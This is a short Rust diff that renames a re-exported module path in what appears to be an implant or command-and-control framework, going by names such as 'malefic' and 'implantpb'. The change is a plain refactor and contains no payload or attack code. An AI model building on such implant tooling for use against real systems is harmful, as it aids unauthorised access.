@@ -11,7 +11,7 @@ pub use std::ffi::{c_char, c_int, c_uint, CStr};
 
 // ── Runtime re-exports (used by all module wrappers) ────────────────────────
 
-pub use malefic_runtime::module_sdk::{RtModule, RtChannel, RtResult, RtChannelError};
+pub use malefic_module::module_sdk::{RtModule, RtChannel, RtResult, RtChannelError};
 pub use malefic_proto::proto::implantpb::spite::Body;
 pub use malefic_proto::proto::modulepb::{Request, Response};
 
